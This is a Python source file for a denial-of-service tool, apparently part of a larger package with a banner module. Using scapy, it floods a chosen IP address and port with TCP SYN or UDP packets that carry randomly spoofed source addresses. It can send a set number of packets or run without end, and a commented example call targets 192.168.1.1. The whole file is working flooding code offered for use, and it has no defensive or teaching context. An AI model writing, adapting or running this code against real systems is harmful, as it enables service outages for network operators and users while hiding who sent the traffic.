from scapy.all import IP, TCP, UDP, send
from rich import print
import random
from .banner import print_banner
print_banner()

def SendTcpPacket(target_ip, target_port):
    src_ip = ".".join([str(random.randint(1, 254)) for _ in range(4)])
    src_port = random.randint(1024, 65535)
    
    # Create TCP SYN packet
    ip_layer = IP(src=src_ip, dst=target_ip)
    tcp_layer = TCP(sport=src_port, dport=target_port, flags="S")

    # Send the packet
    send(ip_layer/tcp_layer, verbose=0)

def SendUdpPacket(target_ip, target_port):
    src_ip = ".".join([str(random.randint(1, 254)) for _ in range(4)])
    src_port = random.randint(1024, 65535)
    
    # Create UDP packet
    ip_layer = IP(src=src_ip, dst=target_ip)
    udp_layer = UDP(sport=src_port, dport=target_port)

    # Send the packet
    send(ip_layer/udp_layer, verbose=0)

def Dos(target_ip, target_port, protocol, count=False, value=1):
    if protocol == "tcp":
        if count == False:
            for i in range(int(value)):
                SendTcpPacket(target_ip=target_ip, target_port=target_port)
                print(f"[bold red]Sending TCP packets to {target_ip} on port {target_port}, count = {i}")
        elif count == True:
            try:
                while True:
                    SendTcpPacket(target_ip=target_ip, target_port=target_port)
                    print(f"[bold red]Sending TCP packets to {target_ip} on port {target_port}")
            except KeyboardInterrupt:
                exit()
            except Exception as e:
                print(f"A small error occurred: {e}")
    
    elif protocol == "udp":
        if count == False:
            for i in range(int(value)):
                SendUdpPacket(target_ip=target_ip, target_port=target_port)
                print(f"[bold red]Sending UDP packets to {target_ip} on port {target_port}, count = {i}")
        elif count == True:
            try:
                while True:
                    SendUdpPacket(target_ip=target_ip, target_port=target_port)
                    print(f"[bold red]Sending UDP packets to {target_ip} on port {target_port}")
            except KeyboardInterrupt:
                exit()
            except Exception as e:
                print(f"A small error occurred: {e}")

# Example usage:
# Dos("192.168.1.1", 80, "tcp", count=True)
